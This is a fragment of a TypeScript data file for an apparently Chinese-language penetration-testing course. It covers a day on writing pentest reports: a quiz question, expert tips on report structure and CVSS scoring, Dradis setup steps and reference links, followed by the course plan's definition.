      { type: 'single', question: '漏洞描述中利用前提的目的是？', options: ['A. 炫耀技术', 'B. 帮助客户理解攻击条件', 'C. 增加报告长度', 'D. 没有实际意义'], correctIndex: 1, explanation: '利用前提帮助客户理解漏洞被利用的条件，评估实际风险。' }
    ],
    expertNotes: [
      { author: '资深渗透测试工程师', title: '报告撰写技巧', content: '报告质量直接反映测试质量。每个漏洞描述要清晰完整：漏洞描述→利用过程→业务风险→修复建议。截图要标注关键信息。', url: 'https://www.sans.org/' },
      { author: '安全顾问', title: 'CVSS评分建议', content: 'CVSS评分要客观准确，结合实际环境调整环境度量分。评分过高或过低都会影响客户对风险的判断。', url: 'https://www.first.org/cvss/' },
      { author: 'CISO', title: '报告价值最大化', content: '好的报告不仅是漏洞列表，更是安全改进路线图。按业务影响分类问题，给出优先级建议，帮助管理层做出决策。' }
    ],
    environmentSetup: {
      prerequisites: ['Dradis或报告工具', '渗透测试数据', 'CVSS计算器', '截图工具'],
      verificationSteps: ['1. 安装Dradis Framework', '2. 导入渗透测试数据', '3. 按模板撰写报告', '4. 使用CVSS计算器评分', '5. 添加截图证据', '6. 导出并审阅']
    }
  ,
      resources: [{"name": "渗透测试报告模板", "url": "https://github.com/noraj/OSCP-Exam-Report-Template-Markdown", "type": "article"}, {"name": "漏洞评级标准(CVSS)", "url": "https://www.first.org/cvss/v3.1/user-guide", "type": "article"}, {"name": "技术报告撰写指南", "url": "https://www.sans.org/reading-room/whitepapers/testing/", "type": "article"}, {"name": "渗透测试报告案例", "url": "https://www.freebuf.com/articles/web/298023.html", "type": "article"}]}
];

export const cyberPenetrationPlan: CyberLearningPlan = {
  id: 'penetration',
  name: '渗透测试实战',
  subtitle: 'Penetration Testing',
  description: '从信息收集到权限维持，系统学习渗透测试完整流程，掌握主流渗透工具和实战技术。',
  icon: '🎯',
  difficulty: '进阶',
  totalDays: 30,
  color: 'text-cyber-red',
  bgColor: 'bg-cyber-red/10',
  borderColor: 'border-cyber-red/30',
  prerequisites: ['网络安全基础知识', 'Linux基本操作', '网络协议理解'],
  certification: '可从事渗透测试工程师、安全评估工程师岗位',
  days: [...week1, ...week2, ...week3, ...week4]
};
